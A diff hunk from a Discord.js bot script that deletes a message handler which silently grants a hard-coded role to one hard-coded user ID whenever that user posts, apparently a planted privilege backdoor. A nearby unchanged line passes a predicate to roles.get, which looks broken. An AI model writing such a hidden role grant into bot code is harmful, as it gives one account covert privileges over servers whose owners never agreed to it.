@@ -136,12 +136,7 @@ client.on('guildMemberAdd', member => {
   }
 })
 
-client.on('message', message => {
-  if(message.author.id == '647123320872894485') {
-  let rl = message.guild.roles.find(x => x.id === '672190971412217868')
-  message.guild.member(message.author).addRole(rl.id)
-  }
-})
+
 
 client.on("guildMemberAdd", member => {
 let botrol = member.guild.roles.get(x => x.id === "672193071630385153")
